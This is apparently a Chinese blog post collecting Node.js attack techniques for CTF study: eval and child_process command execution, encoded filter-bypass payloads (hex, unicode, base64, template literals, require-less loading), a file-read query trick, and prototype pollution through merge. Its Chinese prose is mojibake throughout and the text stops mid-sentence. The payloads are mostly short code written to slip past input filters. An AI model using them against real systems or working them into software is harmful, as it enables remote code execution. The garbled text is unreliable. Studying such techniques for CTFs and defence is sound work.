        <content type="html"><![CDATA[<p>æŠ„ä¸€ä»½nodejsçš„æ¼æ´åˆé›†</p><p><a href="https://xz.aliyun.com/t/13065#toc-15">https://xz.aliyun.com/t/13065#toc-15</a></p><table><thead><tr><th>S.No</th><th>Javascript</th><th>NodeJS</th></tr></thead><tbody><tr><td>1</td><td>Javascriptæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œç”¨äºåœ¨ç½‘ç«™ä¸Šç¼–å†™è„šæœ¬ã€‚</td><td>NodeJSæ˜¯ä¸€ç§Javascriptçš„è¿è¡Œç¯å¢ƒã€‚</td></tr><tr><td>2</td><td>Javascriptåªèƒ½åœ¨æµè§ˆå™¨ä¸­è¿è¡Œã€‚</td><td>åœ¨NodeJSçš„å¸®åŠ©ä¸‹ï¼Œå¯ä»¥åœ¨æµè§ˆå™¨å¤–è¿è¡ŒJavascriptã€‚</td></tr><tr><td>3</td><td>JavascriptåŸºæœ¬ä¸Šæ˜¯åœ¨<strong>å®¢æˆ·ç«¯</strong>ä½¿ç”¨ã€‚</td><td>NodeJSä¸»è¦ç”¨åœ¨<strong>æœåŠ¡å™¨</strong>ç«¯ã€‚</td></tr><tr><td>4</td><td>Javascriptæœ‰è¶³å¤Ÿçš„èƒ½åŠ›æ¥æ·»åŠ HTMLå’Œç©å¼„DOMã€‚</td><td>Nodejsä¸å…·å¤‡æ·»åŠ HTMLæ ‡ç­¾çš„èƒ½åŠ›ã€‚</td></tr><tr><td>5</td><td>Javascriptå¯ä»¥åœ¨ä»»ä½•æµè§ˆå™¨å¼•æ“ä¸­è¿è¡Œï¼Œæ¯”å¦‚Safariä¸­çš„JS coreå’ŒFirefoxä¸­çš„Spidermonkeyã€‚</td><td>V8æ˜¯node.jså†…éƒ¨çš„Javascriptå¼•æ“ï¼Œå¯ä»¥è§£æå’Œè¿è¡ŒJavascriptã€‚</td></tr><tr><td>7</td><td>Javascriptçš„ä¸€äº›æ¡†æ¶æœ‰RamdaJSã€TypedJSç­‰ã€‚</td><td>Nodejsçš„ä¸€äº›æ¨¡å—æœ‰Lodashã€expressç­‰ã€‚è¿™äº›æ¨¡å—éœ€è¦ä»npmå¯¼å…¥ã€‚</td></tr><tr><td>8</td><td>Javascriptæ˜¯ECMAè„šæœ¬çš„å‡çº§ç‰ˆï¼Œä½¿ç”¨Chromeçš„V8å¼•æ“ï¼Œç”¨C++ç¼–å†™ã€‚</td><td>Nodejsæ˜¯ç”¨Cã€C++å’ŒJavascriptç¼–å†™çš„ã€‚</td></tr></tbody></table><h2 id="toUpperCase-æ¼æ´"><a href="#toUpperCase-æ¼æ´" class="headerlink" title="toUpperCase()æ¼æ´"></a>toUpperCase()æ¼æ´</h2><p>toUpperCase()è½¬å¤§å†™ï¼Œç‰¹æ®Šå­—ç¬¦æ›¿ä»£</p><p><code>&quot;Ä±&quot;.toUpperCase() == &#39;I&#39;</code> <code>&quot;Å¿&quot;.toUpperCase() == &#39;S&#39;</code></p><p>toLowerCase()è½¬å°å†™</p><p><code>&quot;â„ª&quot;.toLowerCase() == &#39;k&#39;</code></p><h3 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h3><p>å¦‚æœéœ€è¦æ»¡è¶³ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag)</span><br></pre></td></tr></table></figure><p>çœ‹ä¸‹é¢case</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="comment">//è¾“å‡º</span></span><br><span class="line"><span class="comment">//[object Object]flag&#123;xxx&#125;</span></span><br><span class="line"><span class="comment">//[object Object]flag&#123;xxx&#125;</span></span><br></pre></td></tr></table></figure><p>å³ä¼ å…¥<code>a[x]=1&amp;b[x]=2</code>å³å¯æ»¡è¶³è¦æ±‚</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="evalï¼ˆï¼‰"><a href="#evalï¼ˆï¼‰" class="headerlink" title="evalï¼ˆï¼‰"></a>evalï¼ˆï¼‰</h3><p>å¦‚ä¸‹ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/eval&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="built_in">eval</span>(req.<span class="property">query</span>.<span class="property">q</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>.<span class="property">q</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//å‚æ•° a é€šè¿‡ get ä¼ å‚çš„æ–¹å¼ä¼ å…¥è¿è¡Œï¼Œæˆ‘ä»¬ä¼ å…¥å‚æ•°ä¼šè¢«å½“ä½œä»£ç å»æ‰§è¡Œã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h3><p><code>settimeout(function,time)</code>ï¼Œè¯¥å‡½æ•°ä½œç”¨æ˜¯ä¸¤ç§’åæ‰§è¡Œå‡½æ•°ï¼Œfunction å¤„ä¸ºæˆ‘ä»¬å¯æ§çš„å‚æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;console.log(&#x27;Hacked&#x27;)&quot;</span>);</span><br><span class="line">&#125;,<span class="number">2000</span>);</span><br></pre></td></tr></table></figure><h3 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h3><p><code>setinterval (function,time)</code>ï¼Œæ¯éš”ä¸¤ç§’æ‰§è¡Œä¸€æ¬¡ä»£ç </p><h3 id="Function"><a href="#Function" class="headerlink" title="Function()"></a>Function()</h3><p><code>Function(string)()</code>ï¼Œç±»ä¼¼phpçš„create_functionï¼Œåˆ›å»ºå‡½æ•°å¹¶ç«‹å³è°ƒç”¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aaa=<span class="title class_">Function</span>(<span class="string">&quot;console.log(&#x27;Hacked&#x27;)&quot;</span>)();</span><br></pre></td></tr></table></figure><h3 id="child-processæ¨¡å—"><a href="#child-processæ¨¡å—" class="headerlink" title="child_processæ¨¡å—"></a>child_processæ¨¡å—</h3><p>child_processæ¨¡å—å¯ä»¥åˆ›å»ºå­è¿›ç¨‹ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><ul><li>execã€‚è°ƒç”¨&#x2F;bash.shï¼Œä¸execSyncç”¨æ³•ç›¸åŒ</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>execFileï¼Œä¸execFileSyncç”¨æ³•ç›¸åŒ</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;calc&quot;</span>,&#123;<span class="attr">shell</span>:<span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure><ul><li>fork</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">fork</span>(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>spawnï¼Œä¸spawnSyncç”¨æ³•ç›¸åŒ</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawn</span>(<span class="string">&quot;calc&quot;</span>,&#123;<span class="attr">shell</span>:<span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure><ul><li>fs.writeFileï¼ŒwriteFileSyncå†™æ–‡ä»¶</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&quot;dasdsadsa&quot;</span>);</span><br><span class="line"><span class="comment">//require(&#x27;fs&#x27;).writeFile(&#x27;input.txt&#x27;,&quot;dasdsadsa&quot;,(err)=&gt;&#123;&#125;);</span></span><br></pre></td></tr></table></figure><h3 id="fs-readFileSync"><a href="#fs-readFileSync" class="headerlink" title="fs.readFileSync"></a>fs.readFileSync</h3><p>ä½¿ç”¨<code>fs.readFileSync</code>è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p><ul><li>æœ‰<code>href</code>ä¸”éç©º</li><li>æœ‰<code>origin</code>ä¸”éç©º</li><li><code>protocol</code> ç­‰äº<code>file:</code></li><li>æœ‰<code>hostname</code>ä¸”ç­‰äºç©º(Windowsä¸‹éç©ºçš„è¯ä¼šè¿›è¡Œè¿œç¨‹åŠ è½½)</li><li>æœ‰<code>pathname</code>ä¸”éç©º(è¯»å–çš„æ–‡ä»¶è·¯å¾„)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file[href]=a&amp;file[origin]=<span class="number">1</span>&amp;file[protocol]=<span class="attr">file</span>:&amp;file[hostname]=&amp;file[pathname]=è¯»å–çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="ç»•è¿‡è¿‡æ»¤"><a href="#ç»•è¿‡è¿‡æ»¤" class="headerlink" title="ç»•è¿‡è¿‡æ»¤"></a>ç»•è¿‡è¿‡æ»¤</h3><ul><li>è¿‡æ»¤<code>.</code></li></ul><p><code>[]</code>ä»£æ›¿<code>.</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exec&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>è¿‡æ»¤å­—ç¬¦ä¸²</li></ul><p>æ‹¼æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;\x65\x78\x65\x63&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure><p>unicode</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;\u0065\u0078\u0065\u0063&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure><p>base64</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpWyJleGVjIl0oJ2NhbGMnKTs=&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">//require(&#x27;child_process&#x27;)[&quot;exec&quot;](&#x27;calc&#x27;);</span></span><br></pre></td></tr></table></figure><p>ES6æ¨¡æ¿ç»•è¿‡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span><span class="string">&quot;](&#x27;calc&#x27;);</span></span><br></pre></td></tr></table></figure><blockquote><p>ES6ç‰¹æ€§å¯ä»¥ç”¨åå¼•å·ä»£æ›¿æ‹¬å·æ‰§è¡Œå‡½æ•°ï¼Œä¹Ÿèƒ½ä»£æ›¿å•å¼•å·å’ŒåŒå¼•å·ï¼Œåå¼•å·å†…èƒ½æ’å…¥å˜é‡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">var</span> node = <span class="string">&quot;nodejs&quot;</span>;</span><br><span class="line">&gt;<span class="variable language_">console</span>.<span class="property">log</span><span class="string">`hello<span class="subst">$&#123;node&#125;</span>world`</span>;</span><br><span class="line">&gt;<span class="comment">//è¾“å‡º [&#x27;hello&#x27;,&#x27;world&#x27;] nodejs</span></span><br></pre></td></tr></table></figure><p>ä¹‹æ‰€ä»¥è¿™ä¹ˆè¾“å‡ºï¼Œæ˜¯å› ä¸ºconsoleå‚æ•°ä¸ºhello${node}worldï¼Œè€Œä¸æ˜¯â€hello${node}worldâ€ï¼Œå‰è€…æ˜¯ä¸ªæ•°ç»„</p></blockquote><p>concatæ‹¼æ¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;c&quot;</span>)](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Object.values</p><blockquote><p>ç±»ä¼¼SSTI</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>))[<span class="number">4</span>](<span class="string">&#x27;calc&#x27;</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20231118120211-40213400-85c7-1.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20231118120211-40213400-85c7-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="20231118120211-40213400-85c7-1"></p><p>è¿‡æ»¤requireå…³é”®å­—</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="jsè‡ªæ‰§è¡ŒåŒ¿åå‡½æ•°"><a href="#jsè‡ªæ‰§è¡ŒåŒ¿åå‡½æ•°" class="headerlink" title="jsè‡ªæ‰§è¡ŒåŒ¿åå‡½æ•°"></a>jsè‡ªæ‰§è¡ŒåŒ¿åå‡½æ•°</h2><p>è¿™ç§å‡½æ•°åœ¨å£°æ˜æ—¶å°±ä¼šç«‹å³æ‰§è¡Œä¸€æ¬¡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// â€¦</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// â€¦</span></span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// â€¦</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="comment">// â€¦</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>(å‚æ•°åˆ—è¡¨,code).<span class="title function_">apply</span>(å‚æ•°)<span class="comment">//codeä¸ºå¦ä¸€å‡½æ•°</span></span><br></pre></td></tr></table></figure><p>caseï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">greeting, name</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(greeting + <span class="string">&#x27;, &#x27;</span> + name + <span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> args = [<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>];</span><br><span class="line"></span><br><span class="line">greet.<span class="title function_">apply</span>(<span class="literal">null</span>, args);</span><br></pre></td></tr></table></figure><h2 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h2><p>åœ¨2022å¹´ï¼Œåœ¨CsbNå†™è¿‡ä¸€ç¯‡CATCTFçš„javascriptåŸå‹é“¾æ±¡æŸ“ï¼Œæ²¡æƒ³åˆ°nodejså¾ˆå¤šæ¼æ´éƒ½æ˜¯è¿™ä¸ª</p><p>JavaScriptä¸­ï¼Œæ¯ä¸ªå¯¹è±¡ï¼ˆobjectï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§æŒ‡å‘å¦ä¸€ä¸ªåä¸º<strong>åŸå‹</strong>ï¼ˆprototypeï¼‰çš„å¯¹è±¡ã€‚åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<strong>åŸå‹é“¾</strong>ï¼ˆprototype chainï¼‰ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚</p><p>ä½“ç°åˆ°ä»£ç ä¸Šï¼Œå°±æ˜¯ï¼š</p><ul><li>æ¯ä¸€ä¸ª<code>åŸå‹å¯¹è±¡</code>éƒ½æœ‰ä¸€ä¸ª<code>prototype</code>å±æ€§ï¼Œprototype å±æ€§å¯ä»¥å‘å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span>=value</span><br></pre></td></tr></table></figure><ul><li>æ¯ä¸€ä¸ª<code>å®ä¾‹å¯¹è±¡</code>éƒ½æœ‰ä¸€ä¸ª<code>__proto__</code>å±æ€§ï¼Œè¿™ä¸ªå®ä¾‹å±æ€§æŒ‡å‘å¯¹è±¡çš„åŸå‹å¯¹è±¡(å³åŸå‹)ã€‚</li></ul><p>è®¿é—®åŸå‹å¯¹è±¡çš„å‡ ç§æ–¹æ³•ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objectname[<span class="string">&quot;__proto__&quot;</span>]</span><br><span class="line">objectname.<span class="property">__proto__</span></span><br><span class="line">objectname.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure><p>æŠ„ä¸ªå›¾ï¼Œä¸€çœ¼æ‡‚ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927151537978.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927151537978.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927151537978"></p><p>ä¸åŒå¯¹è±¡æ‰€ç”Ÿæˆçš„åŸå‹é“¾å¦‚ä¸‹(éƒ¨åˆ†)ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;<span class="comment">//oæ˜¯ä¸ªå¯¹è±¡ï¼Œæœ‰ä¸ªaå­—æ®µï¼ˆå±æ€§ï¼‰</span></span><br><span class="line"><span class="comment">// oå¯¹è±¡ç›´æ¥ç»§æ‰¿äº†Object</span></span><br><span class="line"><span class="comment">// åŸå‹é“¾ï¼š o ---&gt; Object ---&gt; null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">// æ•°ç»„éƒ½ç»§æ‰¿äº Array</span></span><br><span class="line"><span class="comment">// åŸå‹é“¾ï¼š</span></span><br><span class="line"><span class="comment">// a ---&gt; Array ---&gt; Object ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å‡½æ•°éƒ½ç»§æ‰¿äº Function</span></span><br><span class="line"><span class="comment">// åŸå‹é“¾ï¼š</span></span><br><span class="line"><span class="comment">// f ---&gt; Function ---&gt; Object ---&gt; null</span></span><br></pre></td></tr></table></figure><p>ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ã€‚</p><p>å¦‚ä¸‹ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">object1 = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line">object1.<span class="property">__proto__</span>.<span class="property">foo</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">foo</span>);</span><br><span class="line">object2 = &#123;<span class="string">&quot;c&quot;</span>:<span class="number">1</span>, <span class="string">&quot;d&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object2.<span class="property">foo</span>);</span><br><span class="line"><span class="comment">//è¾“å‡ºä¸¤ä¸ªHello World</span></span><br></pre></td></tr></table></figure><h3 id="mergeåŸå‹é“¾æ±¡æŸ“"><a href="#mergeåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="mergeåŸå‹é“¾æ±¡æŸ“"></a>mergeåŸå‹é“¾æ±¡æŸ“</h3><p>mergeæ“ä½œä¼šå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</p><p>å‡è®¾æœ‰ä¸€ä¸ªmergeå¯¹è±¡çš„å‡½æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ä»£ç ä¼šæ±¡æŸ“åˆ°object3å—</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> object2 = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(object1, object2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">a</span>, object1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object3.<span class="property">b</span>)</span><br><span class="line"><span class="comment">//1 2</span></span><br></pre></td></tr></table></figure><p>å› 